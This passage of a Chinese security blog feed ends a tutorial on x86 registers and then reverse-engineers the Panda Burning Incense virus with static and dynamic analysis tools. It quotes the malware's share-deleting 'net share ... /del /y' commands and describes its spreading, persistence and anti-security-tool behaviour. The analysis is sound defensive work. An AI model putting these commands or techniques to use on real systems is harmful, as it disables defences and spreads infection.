title="DX寄存器"></a>DX寄存器</h3><p>dx寄存器和之前的寄存器一样，都是能暂存一般数据，在之前的汇编代码中可以发现编译器会将(通用寄存器)和si、di都拿来暂存一般的数据，除此之外之前还介绍过乘法和除法的值也会写入dx中。</p><p>dx用作乘法的时候，用来存储ax寄存器不够存储的高位数据</p><p><img src="https://img2020.cnblogs.com/blog/2080041/202109/2080041-20210914152838599-2100338053.png" alt="image-20210914152839479"> </p><p>dx用作除法的时候前面介绍过了，用来存储余数。</p><h2 id="段寄存器"><a href="#段寄存器" class="headerlink" title="段寄存器"></a>段寄存器</h2><p>CPU中包含了四个段寄存器，用作程序指令，数据或栈的基础位置。ps:(不过在Windows中好像这些段寄存器没什么用，因为Windows用了平坦模式,每个段的地址都一样都是0，直接用偏移来定位)</p><p>段寄存器主要的功能如下：</p><ul><li><code>CS(Code Segment)</code> ： 代码寄存器，程序代码的基础位置</li><li><code>DS(Data Segment)</code>： 数据寄存器，变量的基本位置</li><li><code>SS(Stack Segment)</code>： 栈寄存器，栈的基础位置</li><li><code>ES(Extra Segment)</code>： 其他寄存器，内存中变量的其他基本位置。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov cs:[xxx],ax</span><br><span class="line">mov ds:[xxx],ax</span><br><span class="line">mov ss:[xxx],ax</span><br><span class="line">mov es:[xxx],ax</span><br></pre></td></tr></table></figure><h2 id="偏移-索引-寄存器"><a href="#偏移-索引-寄存器" class="headerlink" title="偏移(索引)寄存器"></a>偏移(索引)寄存器</h2><p>偏移寄存器或者叫索引寄存器，主要是包含段地址的偏移量，用来进行内存地址的定位。</p><ul><li><code>BP(Base Pointer)</code>：基础指针，它是栈寄存器上的偏移量，用来定位栈上变量</li><li><code>SP(Stack Pointer)</code>: 栈指针，它是栈寄存器上的偏移量，用来定位栈顶</li><li><code>SI(Source Index)</code>: 变址寄存器，用来拷贝源字符串</li><li><code>DI(Destination Index)</code>: 目标变址寄存器，用来复制到目标字符串</li></ul><h3 id="BP基础指针寄存器"><a href="#BP基础指针寄存器" class="headerlink" title="BP基础指针寄存器"></a>BP基础指针寄存器</h3><p>用<code>[bp-xx]</code>表示变量</p><p><img src="https://img2020.cnblogs.com/blog/2080041/202109/2080041-20210914171746160-1570992170.png" alt="image-20210914171745745"> </p><p>用<code>[bp+xx]</code>表示函数参数</p><p><img src="https://img2020.cnblogs.com/blog/2080041/202109/2080041-20210914182612169-1166698097.png" alt="image-20210914182611731"> </p><p>堆栈数据中<code>bp+6</code>开始就是<code>test</code>函数的第一个参数直到<code>bp+16</code>为止。</p><p><img src="https://img2020.cnblogs.com/blog/2080041/202109/2080041-20210914183856443-1495790330.png" alt="image-20210914183856027"> </p><h3 id="SP栈指针寄存器"><a href="#SP栈指针寄存器" class="headerlink" title="SP栈指针寄存器"></a>SP栈指针寄存器</h3><p>这个其实主要是栈顶指针，无论何时sp指针都执行栈的顶部，[栈是一个从高地址向下生长的内存]。</p><p>push数据时候 sp指针情况(sp地址会减少)</p><p><img src="https://img2020.cnblogs.com/blog/2080041/202109/2080041-20210914184634435-1913240738.png" alt="image-20210914184634142"> </p><p><img src="https://img2020.cnblogs.com/blog/2080041/202109/2080041-20210914184959329-1499835514.png" alt="image-20210914184958415"> </p><p>pop数据时候 sp指针情况(sp地址会增加)</p><p><img src="https://img2020.cnblogs.com/blog/2080041/202109/2080041-20210914185226406-1434454689.png" alt="image-20210914185226125"> </p><h3 id="SI变址寄存器"><a href="#SI变址寄存器" class="headerlink" title="SI变址寄存器"></a>SI变址寄存器</h3><p>si寄存器是变址寄存器，可以用来存放寻址用的偏移，此外si还被用作隐含的源串地址，默认在DS段中。<br>[无论是si还是di这两个寄存器总感觉和字符串都有点关系,c++的string?]</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">char source[]&#x3D;&quot;hello,world&quot;; (假装&#x3D;esi寄存器)</span><br><span class="line">char dest[]&#x3D;&#123;0&#125;;             (假装&#x3D;edi寄存器)</span><br><span class="line">;----------------------------------------------</span><br><span class="line">mov ecx,strlen(source) ;字符串长度</span><br><span class="line">rep movsb ;重复循环 并且传输字符串</span><br><span class="line">;----------------------------------------------</span><br><span class="line">[dest] &#x3D; &quot;hello,world&quot;</span><br></pre></td></tr></table></figure><p><img src="https://img2020.cnblogs.com/blog/2080041/202109/2080041-20210915135422760-1865092579.png" alt="image-20210915135422905"> </p><h3 id="DI目标变址寄存器"><a href="#DI目标变址寄存器" class="headerlink" title="DI目标变址寄存器"></a>DI目标变址寄存器</h3><p>di寄存器是目标变址寄存器，和si一样可以用来存放寻址用的偏移，此外di还被用作隐含的目的串地址，默认在ES段中。</p><p>先来看看STOS指令的介绍：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">字符串存储指令 STOS </span><br><span class="line"></span><br><span class="line">格式: STOS OPRD</span><br><span class="line"></span><br><span class="line">功能: 把AL(字节)或AX(字)中的数据存储到DI为目的串地址指针所寻址的存储器单元中去.指针DI将根据DF的值进行自动调整.</span><br></pre></td></tr></table></figure><p>接下来我们来看看，在汇编语言中是如何实现高级语言中清空数组的操作，以下是一个初始化字符数组的高级代码。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> szMsg[<span class="number">500</span>]=&#123;<span class="number">0</span>&#125;;</span><br></pre></td></tr></table></figure><p>翻译后的汇编代码。</p><p><img src="https://img2020.cnblogs.com/blog/2080041/202109/2080041-20210915111540894-1239808845.png" alt="image-20210915111540944"> </p><p>上面的汇编代码执行完后，可以发现szMsg数组的内容全部被清空了。</p><p><img src="https://img2020.cnblogs.com/blog/2080041/202109/2080041-20210915111758868-1393854060.png" alt="image-20210915111759044"> </p><p><img src="https://img2020.cnblogs.com/blog/2080041/202109/2080041-20210915112024099-1404625774.png" alt="image-20210915112024226"> </p><h2 id="IP寄存器"><a href="#IP寄存器" class="headerlink" title="IP寄存器"></a>IP寄存器</h2><p><code>IP(Instruction Pointer)</code>： 指令指针寄存器，它是从 Code Segment 代码寄存器处的偏移来存储执行的下一条指令。</p><h2 id="标志寄存器"><a href="#标志寄存器" class="headerlink" title="标志寄存器"></a>标志寄存器</h2><p>就剩下两种寄存器还没聊了，这两种寄存器是指令指针寄存器和标志寄存器：</p><ul><li><code>FLAG</code> : Flag 寄存器用于存储当前进程的状态，这些状态有<ul><li>位置 (Direction)：用于数据块的传输方向，是向上传输还是向下传输</li><li>中断标志位 (Interrupt) ：1 - 允许；0 - 禁止</li><li>陷入位 (Trap) ：确定每条指令执行完成后，CPU 是否应该停止。1 - 开启，0 - 关闭</li><li>进位 (Carry) : 设置最后一个无符号算术运算是否带有进位</li><li>溢出 (Overflow) : 设置最后一个有符号运算是否溢出</li><li>符号 (Sign) : 如果最后一次算术运算为负，则设置 1 =负，0 =正</li><li>零位 (Zero) : 如果最后一次算术运算结果为零，1 = 零</li><li>辅助进位 (Aux Carry) ：用于第三位到第四位的进位</li><li>奇偶校验 (Parity) : 用于奇偶校验</li></ul></li></ul><blockquote><p>参考文献：<br><a href="https://blog.csdn.net/qq_39654127/article/details/88698911">https://blog.csdn.net/qq_39654127/article/details/88698911</a> 《王爽汇编笔记》<br><a href="https://segmentfault.com/a/1190000037478310%E3%80%8A%E5%8D%81%E4%B8%80%E5%81%87%E6%9C%9F%E6%B7%A6%E4%BA%86%E5%85%AB%E5%A4%A9%E5%AF%84%E5%AD%98%E5%99%A8%E7%9A%84%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E3%80%8B">https://segmentfault.com/a/1190000037478310《十一假期淦了八天寄存器的相关知识》</a><br><a href="https://docs.microsoft.com/zh-cn/cpp/build/reference/fa-fa-listing-file?view=msvc-160%E3%80%8A/FA/Fa%E4%BD%BF%E7%94%A8%E3%80%8B">https://docs.microsoft.com/zh-cn/cpp/build/reference/fa-fa-listing-file?view=msvc-160《/FA/Fa使用》</a><br><a href="https://blog.csdn.net/bagboy_taobao_com/article/details/6203705">https://blog.csdn.net/bagboy_taobao_com/article/details/6203705</a> 《了解寄存器:ESI EDI变址寄存器》<br><a href="http://c.biancheng.net/view/3679.html%E3%80%8A%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%9F%BA%E6%9C%AC%E6%8C%87%E4%BB%A4%E7%AE%80%E4%BB%8B%E3%80%8B">http://c.biancheng.net/view/3679.html《汇编语言字符串基本指令简介》</a><br><a href="https://blog.csdn.net/weixin_43216249/article/details/110728729%E3%80%8A%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0--%E4%B8%B2%E6%93%8D%E4%BD%9C%E7%AF%87%EF%BC%88c++%E7%9A%84string%EF%BC%9F%EF%BC%9F%EF%BC%9F%EF%BC%89%E3%80%8B">https://blog.csdn.net/weixin_43216249/article/details/110728729《汇编语言学习笔记--串操作篇（c++的string？？？）》</a></p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;/&gt;

&lt;h2 id=&quot;寄存器知识&quot;&gt;&lt;a href=&quot;#寄存器知识&quot; class=&quot;headerlink&quot; title=&quot;寄存器知识&quot;&gt;&lt;/a&gt;寄存器知识&lt;/h2&gt;&lt;p&gt;一个典型的CPU由运算</summary>
      
    
    
    
    <category term="PC逆向" scheme="https://vxer-lee.github.io/categories/PC%E9%80%86%E5%90%91/"/>
    
    
    <category term="汇编" scheme="https://vxer-lee.github.io/tags/%E6%B1%87%E7%BC%96/"/>
    
  </entry>
  
  <entry>
    <title>恶意代码分析实战六：熊猫烧香病毒分析</title>
    <link href="https://vxer-lee.github.io/2021/09/07/MalwareAnalysis/6.Panda/"/>
    <id>https://vxer-lee.github.io/2021/09/07/MalwareAnalysis/6.Panda/</id>
    <published>2021-09-07T09:06:43.000Z</published>
    <updated>2021-09-07T09:06:43.000Z</updated>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/> <p>这一节主要通过熊猫烧香病毒来进行融会贯通，将前面学到过的所有知识都进行实践。</p><p>所有的例子和工具都可以在<a href="https://github.com/Vxer-Lee/MalwareAnalysis%E9%87%8C%E9%9D%A2%E4%B8%8B%E8%BD%BD%E5%88%B0%E3%80%82">https://github.com/Vxer-Lee/MalwareAnalysis里面下载到。</a></p><h2 id="熊猫烧香行为分析"><a href="#熊猫烧香行为分析" class="headerlink" title="熊猫烧香行为分析"></a>熊猫烧香行为分析</h2><h3 id="查壳"><a href="#查壳" class="headerlink" title="查壳"></a>查壳</h3><p>因为程序肯定是病毒,我就不上传杀毒网去查杀了。正常我们在分析一个未知恶意程序的时候，流程都是要先上传杀毒网看看。</p><p>用<code>PEID</code>进行查壳，显示未加壳，程序采用<code>Delphi</code>语言开发。</p><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210827103454269-846650369.png" alt="image-20210827103454071"> </p><p>补充下Dephi开发的程序和C++开发的程序的一些区别。</p><blockquote><p>区别：<br>1.Delphi在函数调用时参数的传递不完全用栈，主要用寄存器。<br>2.而C++程序函数调用前会使用push语句将参数入栈，然后再进行call。<br>3.Delphi一般将第一个参数放入eax寄存器，第二个参数放入edx，第三个参数放入ecx寄存器，其余参数按照与VC程序类似的方式压栈。<br>4.总之，Delphi编译器默认以register方式传递函数参数。这一点与VC编译的程序完全不同。<br>5.提示：栈上给局部变量分配空间的时候，栈是向下增长的，而栈上的数组、字符串、结构体等却是向上增长的。理解这一点可以帮助识别栈上的变量。</p></blockquote><h3 id="简单静态分析"><a href="#简单静态分析" class="headerlink" title="简单静态分析"></a>简单静态分析</h3><p>用Strings和Dependency分别对熊猫烧香的字符串和导出表进行分析。<br>首先来看Strings分析出的字符串,这里面显示出了很多弱口令密码，猜测应该是会爆破内网的135端口弱口令，来入侵内网机器传播病毒的一个方式。还可以看到程序可能会自动感染U盘。导出表中分析出<code>URLDownload</code>函数，此函数多为下载者恶意程序。</p><ul><li>弱口令内网135端口爆破</li><li>感染U盘</li><li>下载者功能</li></ul><p>135弱口令爆破密码</p><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210827104629417-521133168.png" alt="image-20210827104629392"> </p><p>U盘感染字符串关键字</p><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210827104943218-1468864770.png" alt="image-20210827104943333"> </p><p>恶意下载者函数</p><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210827105500889-1666276858.png" alt="image-20210827105500951"> </p><h3 id="行为分析"><a href="#行为分析" class="headerlink" title="行为分析"></a>行为分析</h3><h4 id="进程树监控"><a href="#进程树监控" class="headerlink" title="进程树监控"></a>进程树监控</h4><p>​    这里我们还是用Process Monitor来监控病毒行为，打开Process Monitor，在筛选条件中将“样本.exe”加入到筛选器的“Process Name”中，然后运行病毒，首先可以查看一下进程树：</p><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210827110005749-2018633600.png" alt="image-20210827110005740"> </p><p>​    在进程树中可以发现，“样本.exe”衍生出了”spoclsv.exe”。衍生出的进程又打开了两次“cmd.exe”。</p><ul><li>“cmd.exe /c net share C$ /del /y”</li><li>“cmd.exe /c net share admin$ /del /y”</li></ul><p>第一条命令,它的意思是在命令行模式下删除C盘的网络共享，执行完后关闭cmd.exe。因为我的虚拟机里面只有一个C盘，所以我们有理由相信，这个病毒应该是会关闭系统中所有磁盘的网络共享。</p><p>第二条命令是取消系统根目录的共享。</p><h4 id="注册表监控"><a href="#注册表监控" class="headerlink" title="注册表监控"></a>注册表监控</h4><p>​    将<code>RegSetValue</code>添加到筛选器的“Operation”中，可以看到注册表的行为：</p><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210827111327555-2099761530.png" alt="image-20210827111327702"> </p><p>​    注册表的这个位置主要是用来随机数种子的生成，仅仅靠这条信息是无法推测出病毒的行为的，所以这里我们认为“样本.exe”对于注册表是没有实质的影响。</p><h4 id="文件监控"><a href="#文件监控" class="headerlink" title="文件监控"></a>文件监控</h4><p>​    将<code>CreateFile</code>添加到筛选器的“Operation”中，可以看到文件操作的行为：</p><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210827111709031-913077005.png" alt="image-20210827111709130"> </p><p>​    可以在标红处位置看见，“样本.exe”在<code>C:\Windows\system32\drivers</code>目录创建了文件”spoclsv.exe”，之后就没有什么可疑的文件操作了，所以我们可以判断，这个恶意百度真正的破坏部分是由”spoclsv.exe”实现的，那么我们接下来就是专门来监控这个进程即可。</p><h4 id="spoclsv-exe注册表监控"><a href="#spoclsv-exe注册表监控" class="headerlink" title="spoclsv.exe注册表监控"></a>spoclsv.exe注册表监控</h4><p>​    这里我们需要将进程<code>spoclsv.exe</code>的进程加入筛选器进行分析。一般来说，病毒所产生的操作会比较多，所以我们这里为了便于讨论研究，我们就只列出比较常用的操作选项来显示，我们先来看看<code>RegCreateKey</code>和<code>RegSetValue</code>：</p><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210827125313608-612008155.png" alt="image-20210827125313432"> </p><p>​        可见，恶意程序创建了一个启动项<code>svcshare</code>，使<code>spoclsv.exe</code>每次重启后可继续运行。接着还可以看到<code>Hidden</code>关键字，对注册表的这个位置进行设置，能够实现文件的隐藏。此处进行设置后，即便在”文件夹选项”中选择”显示所有文件和文件夹”，也无法显示隐藏文件。</p><p>​    接着我们来看看<code>RegDeleteValue</code>：</p><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210827125823405-1212262503.png" alt="image-20210827125823596"> </p><p>​    可见恶意程序会将当时几乎所有的安全类工具的启动项都给删除。</p><h4 id="spoclsv-exe文件监控"><a href="#spoclsv-exe文件监控" class="headerlink" title="spoclsv.exe文件监控"></a>spoclsv.exe文件监控</h4><p>​    对于文件的监控，主要是看病毒是否将自己复制到其他目录，或者是创建输出了哪些文件等，监控如下：</p><p> <img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210827130544487-23954527.png" alt="image-20210827130544692"> </p><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210827130343259-1388850787.png" alt="image-20210827130343372"> </p><p>​    可见，恶意程序会在<code>C:\Windows\system32\drivers</code>创建<code>spoclsv.exe</code>这个文件，然后会在C盘根目录创建<code>setup.exe</code>和<code>autorun.inf</code>，并且还会在一些目录生成<code>Desktop_.ini</code>文件。因为创建了这些文件之后就对注册表中的SHOWALL项进行了设置，使得隐藏文件无法显示，因此这些所创建出来的文件属性都是隐藏的。</p><h4 id="spoclsv-exe网络监控分析"><a href="#spoclsv-exe网络监控分析" class="headerlink" title="spoclsv.exe网络监控分析"></a>spoclsv.exe网络监控分析</h4><p>​    在<code>Process Monitor</code>工具栏中只选择<code>Show NetWork Activity</code>，见如下图：</p><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210827131227191-961850397.png" alt="image-20210827131227383"> </p><p>​    图中，192.168.200.x是我虚拟机的内网网段，可见恶意程序会不断的尝试连接我内网中的其他计算机，而且还会向<code>47.74.46.59</code>访问http发送和接受数据。</p><h3 id="行为总结"><a href="#行为总结" class="headerlink" title="行为总结"></a>行为总结</h3><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210827132645546-1459178767.png" alt="image-20210827132645420"> </p><h2 id="熊猫烧香逆向分析"><a href="#熊猫烧香逆向分析" class="headerlink" title="熊猫烧香逆向分析"></a>熊猫烧香逆向分析</h2><p>​    在这里我们利用逆向界的倚天剑和屠龙刀，IDA和OD来对熊猫烧香进行逆向分析，对其内部实现的原理有个了解，因为篇幅关系不会对整个程序彻底分析，而是挑拣一些重要内容进行分析。</p><h3 id="main入口函数"><a href="#main入口函数" class="headerlink" title="main入口函数"></a>main入口函数</h3><p>用“倚天剑”IDA Pro载入样本后可以看到如下图：</p><p>图1是样本的main函数入口最开始的汇编代码，我们不从第一行汇编代码开始看，因为大部分内容都是Delphi自动生成的，我们只找关键位置来看。</p><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210827160013153-638829765.png" alt="image-20210827160013027"> </p><p>图2是和图1连在一起的，因为图片太长我就分两次截图了，我们这次任务就是分析这两张图中的细节。</p><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210827160029527-1898049847.png" alt="image-20210827160029840"> </p><h3 id="sub-403C98-AllocStrCpy"><a href="#sub-403C98-AllocStrCpy" class="headerlink" title="sub_403C98(AllocStrCpy)"></a>sub_403C98(AllocStrCpy)</h3><h4 id="Part1："><a href="#Part1：" class="headerlink" title="Part1："></a>Part1：</h4><p>​    我们在图1中可以看到有两个sub_403C98的函数，因为之前说过上面代码都是Delphi自动生成的，所以这里就不分析，我们最开始的地方应当是标红这位置开始分析：</p><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210827160638445-1095291330.png" alt="image-20210827160638795"> </p><p>​    在图中我们可以看到两处地方都有个<code>edx</code>寄存器赋值,我们之前说过Delphi程序用寄存器来传参数,所以这里的eax和edx都是call的参数,我们下面来仔细看看是什么数据给了<code>edx</code>。</p><h4 id="Part2"><a href="#Part2" class="headerlink" title="Part2:"></a>Part2:</h4><p>​    双击<code>dword_40CC40</code>处，IDA会跳转到如下地方：</p><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210827161832442-26509263.png" alt="image-20210827161832651"> </p><p>​    其实这些都是中文数据，只不过IDA Pro没有自动识别出来，我们可以按<code>alt+a</code>出现如下界面后选<code>C-style</code>，就可以在图中看到IDA Pro把数据识别成了<code>***武*汉*男*生*感*染*下*载*者***</code>的中文。</p><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210827162210284-1031898902.png" alt="image-20210827162210508"> </p><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210827162442878-1705923745.png" alt="image-20210827162443256"> </p><h4 id="Part3："><a href="#Part3：" class="headerlink" title="Part3："></a>Part3：</h4><p>​    我们再来看看是什么数据给了eax寄存器，同样双击<code>dword_40E7D4</code>处，IDA Pro跳转如下：</p><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210827163515606-557715664.png" alt="image-20210827163513504"> </p><p>​    可见IDA Pro跳转到了BSS段，我们可以猜测<code>dword_40E7D4</code>是一个未初始化的全局变量，接着我们来用屠龙刀OD 来验证下，call函数过后会把什么数据放入这个全局变量。</p><h4 id="Part4"><a href="#Part4" class="headerlink" title="Part4:"></a>Part4:</h4><p>​    载入程序后，在<code>0x0040CB7E</code>地址处进行下断，然后F9运行到此位置：</p><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210827164013802-438884023.png" alt="image-20210827164014113"> </p><p>​    接着我们鼠标右键<code>数据窗口中跟随</code>eax寄存器，此时在内存数据窗口中跳转到了eax寄存器的地址处，并且可以从如下图中看到<code>0x0040E7D4</code>处的内容是0，因为全局变量未初始化时候，编译器默认会将数据初始为0。</p><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210827164156179-1729690314.png" alt="image-20210827164156549"> </p><p>​    这时候我们F8单步步过Call后，可见有数据被写入到地址中了。</p><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210827164544910-1642700624.png" alt="image-20210827164545148"> </p><p>​    因为写入的是一个地址数据，所以我们要在内存窗口中右键<code>长型-&gt;地址</code>，来使得数据更加可视化。</p><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210827164704986-1409315842.png" alt="image-20210827164705343"> </p><p>​    其地址的内容就是Call函数传入的第2个参数字符串，<code>***武*汉*男*生*感*染*下*载*者***</code>。</p><p>另外一个<code>感谢艾玛,mopery对此木马的关注!~</code>的Call也是用同样方式进行分析，作者不再赘述，至此我们分析出了<code>sub_403C98</code>函数的功能，并把他重命名为<code>AllocStrCpy</code>拷贝字符串到全局变量中。</p><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210827164846164-456941484.png" alt="image-20210827164846540"> </p><h3 id="sub-405360-Decode"><a href="#sub-405360-Decode" class="headerlink" title="sub_405360(Decode)"></a>sub_405360(Decode)</h3><p>​    接着继续分析第一张图的如下图的地方，从图中可见call sub_405360，有两个参数：(1)xboy，(2)一段看似加密的字符串</p><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210828091830334-412604358.png" alt="image-20210828091830789"> </p><p>​    可见，经过Call后在ecx寄存器中得到了解密后的字符串<code>***武*汉*男*生*感*染*下*载*者***</code>。</p><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210829104939056-235607254.png" alt="image-20210829104938707"> </p><p>​    接着，我们进入Call内部详细分析解密算法，首先：如下图有一个循环的地方值得我们注意，位置在<code>0x4053D1</code></p><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210829105129595-895472299.png" alt="image-20210829105129737"> </p><p>​    之后借助OD的单步调试并且观察寄存器和堆栈信息，逐一对这个循环中的内容进行详细分析：</p><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210829124015674-1657756764.png" alt="image-20210829124015412"> </p><p>​    我用C++代码还原了此汇编的加密算法，运行后得到的结果是一致的。</p><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210830094004994-1611962855.png" alt="image-20210830094005367"> </p><h3 id="Delphi逆向小技巧"><a href="#Delphi逆向小技巧" class="headerlink" title="Delphi逆向小技巧"></a>Delphi逆向小技巧</h3><p>​    其实Delphi有专门的反编译器，其效果不比IDA Pro差，甚至更胜一筹，其中值得比较推荐的一款就是IDR，<a href="https://github.com/crypto2011/IDR">点我下载</a>。</p><p>IDR能分析出IDA Pro无法识别的符号，而且对中文字符串的显示效果也很不错，点击SRC按钮还能反编译成Delphi伪代码。</p><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210830101159277-1018258833.png" alt="image-20210830101159646"> </p><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210830101637650-715445972.png" alt="image-20210830101638529"> </p><p>​    它可以将符号表（Map）文件导出，便于我们在OD中载入符号表进行调试。</p><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210830101930839-1175728359.png" alt="image-20210830101931696"> </p><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210830102047798-163554858.png" alt="image-20210830102048692"> </p><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210830102114759-1334884520.png" alt="image-20210830102115611"> </p><p>​    显示出了Delphi的符号，便于分析和调试。</p><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210830102214299-1663242008.png" alt="image-20210830102215063"> </p><h3 id="sub-404018-strcmp"><a href="#sub-404018-strcmp" class="headerlink" title="sub_404018(strcmp)"></a>sub_404018(strcmp)</h3><p>​    我们用了上面介绍的小技巧后，分析起来就轻松多了，这里直接分析出了<code>sub_404018</code>是一个strcmp字符串比较函数，用来比较解密后的字符串是否等同于全局变量。</p><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210830103011152-1741459999.png" alt="image-20210830103012060"> </p><p>​    这作者好像个智障有没有觉得，他直接把明文写在代码里面用来和解密后的字符串进行比较？那你还加密啥呢？别人不逆你这Decode也能知道解密后的字符串是什么了，真是无语这种写法。</p><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210830103359286-1704758845.png" alt="image-20210830103400055"> </p><h3 id="①-sub-00408024-伪装"><a href="#①-sub-00408024-伪装" class="headerlink" title="① sub_00408024(伪装)"></a>① sub_00408024(伪装)</h3><pre><code> 接下来就是逆向分析这3个Call了，首先我们来分析第一个Call：拷贝自身到系统目录进行伪装，并且设置为隐藏属性，接着用Winexec函数打开系统目录下伪装的程序，并且退出当前进程。</code></pre><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210830103604938-258874241.png" alt="image-20210830103605850"> </p><h4 id="Part1"><a href="#Part1" class="headerlink" title="Part1:"></a>Part1:</h4><p>​    <code>ParamStr</code>函数功能是根据索引返回命令行程序的参数，传入的是0返回结果是命令行程序的路径。</p><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210830111624380-110817802.png" alt="image-20210830111624929"> </p><p>​    传入ParamStr返回来的绝对路径，Call过后返回来程序的目录路径，即<code>C:\Users\Administrator\Desktop</code>，所以sub_00405684可以将其重命名为SubExePath。</p><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210830112531286-1294513129.png" alt="image-20210830112532170"> </p><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210830112623109-410584864.png" alt="image-20210830112624045"> </p><h4 id="Part2-1"><a href="#Part2-1" class="headerlink" title="Part2:"></a>Part2:</h4><p>​    接着会用<code>strcat</code>函数拼接成如下字符串<code>C:\Users\Administrator\Desktop\Desktop_.ini</code>：</p><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210830143235064-1190881435.png" alt="image-20210830143235684"> </p><p>​    传入字符串<code>C:\Users\Administrator\Desktop\Desktop_.ini</code>,Call <code>0x004057A4</code>，用IDR进入这个函数分析后有明显的API函数，可以猜测此函数是将Desktop_.ini这个文件的最后写入时间转换成DOS时间。</p><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210830143602839-519846577.png" alt="image-20210830143603415"> </p><p>​    断点的数据</p><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210830143844816-2041334392.png" alt="image-20210830143843607"> </p><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210830143900975-1316925975.png" alt="image-20210830143901990"> </p><p>​    DOS时间</p><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210830144653533-663073655.png" alt="image-20210830144654099"> </p><p>​    这里面截图截错了,应该是前4个字节对应时间的数据,首先0x531E ,其中0x1E代表的年月日里面的日，其余数据对应的根据MSDN上的文档进行转换。</p><h4 id="part3"><a href="#part3" class="headerlink" title="part3:"></a>part3:</h4><p>​    我们part2分析的函数重命名为<code>GetFileTime2DosTime</code>，然后继续分析下面这一段代码。</p><p>他会根据上面Part2的函数返回值进行判断，如果返回值为0就跳转也就是不存在Desktop_.ini文件就跳转，如果有存在<code>Desktop_.ini</code>文件存在则显示将属性设置为正常，然后再删除此文件。</p><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210831205323853-1972299351.png" alt="image-20210831205323927"> </p><h4 id="part4"><a href="#part4" class="headerlink" title="part4:"></a>part4:</h4><p>​    接着执行完流程后到达<code>00408110</code>位置处继续分析，一开始便是先获取了自身路径然后传入一个call，之后堆栈里面有个下载者相关的字符串信息这个先不管感觉没什么用，然后就是一些字符串的处理一路向下，最后到了红色标记方块处，从OD动态调试分析中可以看出他获取了系统目录然后拼接了成了字符串<code>C:\Windows\system32\drivers\spoclsv.exe</code>，不知道各位大佬还记不记得我们在行为分析的时候，就有分析出样本.exe会把自身拷贝到这个目录，达到伪装隐蔽的效果。</p><p><img src="https://img2020.cnblogs.com/blog/2080041/202109/2080041-20210907111515280-1329685680.png" alt="image-20210907111514532"> </p><h5 id="part5："><a href="#part5：" class="headerlink" title="part5："></a>part5：</h5><p>​    